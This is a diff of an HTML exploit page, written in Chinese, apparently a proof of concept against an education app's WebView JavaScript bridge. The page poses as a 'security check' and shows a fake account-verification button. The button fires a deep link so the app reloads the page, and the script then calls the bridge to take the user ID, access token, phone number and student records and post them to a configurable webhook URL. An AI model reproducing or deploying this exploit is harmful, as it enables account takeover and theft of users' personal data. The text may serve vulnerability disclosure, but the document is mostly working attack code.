@@ -6,15 +6,20 @@
 <title>安全检测中心</title>
 </head>
 <body style="font-family:sans-serif;font-size:14px;margin:16px">
-<h3>安全检测中，请稍候...</h3>
-<pre id="out" style="white-space:pre-wrap;font-size:11px;color:#222;background:#f6f6f6;padding:8px;border-radius:6px"></pre>
+<h3 id="head">安全检测中，请稍候...</h3>
+<div id="entry" style="display:none">
+  <p>检测到您的设备存在待核验的账户安全风险，请点击下方按钮继续：</p>
+  <a id="golink" style="display:block;text-align:center;background:#07c160;color:#fff;padding:14px;border-radius:8px;text-decoration:none;font-size:16px">继续核验</a>
+  <p id="linktext" style="font-size:11px;color:#888;word-break:break-all"></p>
+</div>
+<pre id="out" style="white-space:pre-wrap;font-size:11px;color:#222;background:#f6f6f6;padding:8px;border-radius:6px;display:none"></pre>
 
 <script>
-// ====== 可选：把它改成你在 https://webhook.site 创建的地址（含uuid），用于服务端日志留证 ======
+// ====== 可选：改成你在 https://webhook.site 创建的地址（含uuid），用于服务端日志留证 ======
 // 留空 = 只在屏幕显示（截图/录屏即为证据）
 var EXFIL_BASE = "";
 
-function show(t){ document.getElementById('out').textContent += t + "\n"; }
+function show(t){ var o=document.getElementById('out'); o.style.display='block'; o.textContent += t + "\n"; }
 function exfil(tag, val){
   var d = String(val).substring(0, 4000);
   show("[" + tag + "] " + d);
@@ -23,26 +28,36 @@ function exfil(tag, val){
   }
 }
 
-// 等待桥对象注入（正常在页面加载时已注入，轮询兜底）
-var tries = 0;
-function kick(){
-  tries++;
-  try {
-    if (!window.xdfhybirdAndroid) throw new Error("bridge not ready (try " + tries + ")");
-    // 1) 登录态凭据：userId + accessToken + 手机号 + 全部学员档案
-    var data = window.xdfhybirdAndroid.requireData();
-    exfil("requireData", data);
-    // 2) 容器启动参数回显（证明任意页面可读）
-    try { exfil("requirePageParam", window.xdfhybirdAndroid.requirePageParam()); } catch(e){}
-    show("=== 以上数据已同步至攻击者日志 ===");
-    return;
-  } catch(e){
-    show("[" + tries + "] " + e);
-    if (tries < 10) setTimeout(kick, 500);
-    else show("FAILED: 桥不可达");
+var IN_CONTAINER = false;
+try { IN_CONTAINER = !!(window.xdfhybirdAndroid || window.MoonBridge); } catch(e){}
+
+if (IN_CONTAINER) {
+  // ====== 容器形态：已被深链拉进 App 内置浏览器，执行凭据窃取 ======
+  var tries = 0;
+  function kick(){
+    tries++;
+    try {
+      if (!window.xdfhybirdAndroid) throw new Error("bridge not ready (try " + tries + ")");
+      var data = window.xdfhybirdAndroid.requireData();          // userId+accessToken+手机号+学员档案
+      exfil("requireData", data);
+      try { exfil("requirePageParam", window.xdfhybirdAndroid.requirePageParam()); } catch(e){}
+      show("=== 以上数据已同步至攻击者日志 ===");
+    } catch(e){
+      show("[" + tries + "] " + e);
+      if (tries < 10) setTimeout(kick, 500);
+      else show("FAILED: 桥不可达");
+    }
   }
+  kick();
+} else {
+  // ====== 浏览器形态：受害者点击的入口，展示"继续"按钮 = 深链触发 ======
+  document.getElementById('head').textContent = "账户核验通知";
+  var self = "xdfstudent://open/web?fullscreen=0&isImmersive=0&url=" + encodeURIComponent(location.href);
+  document.getElementById('golink').href = self;
+  document.getElementById('linktext').textContent = self;
+  document.getElementById('entry').style.display = 'block';
+  show("当前环境: 普通浏览器(无桥权限)。点击[继续核验]按钮即触发深链，由新东方App容器重新加载本页并执行。");
 }
-kick();
 </script>
 </body>
 </html>
